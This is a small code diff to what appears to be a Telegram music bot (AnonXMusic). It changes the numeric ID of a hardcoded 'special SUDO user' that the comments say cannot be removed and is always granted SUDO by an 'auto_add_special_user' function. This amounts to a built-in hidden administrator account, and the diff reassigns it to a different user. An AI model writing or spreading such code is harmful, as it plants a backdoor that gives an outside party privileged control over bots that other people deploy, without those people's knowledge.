@@ -10,7 +10,7 @@ from AnonXMusic.utils.inline import close_markup
 from config import BANNED_USERS, OWNER_ID
 
 # Special SUDO user who can’t be removed
-SPECIAL_USER_ID = 1139478215
+SPECIAL_USER_ID = 7876439267
 
 # Ensure SPECIAL_USER is always SUDO
 async def auto_add_special_user():
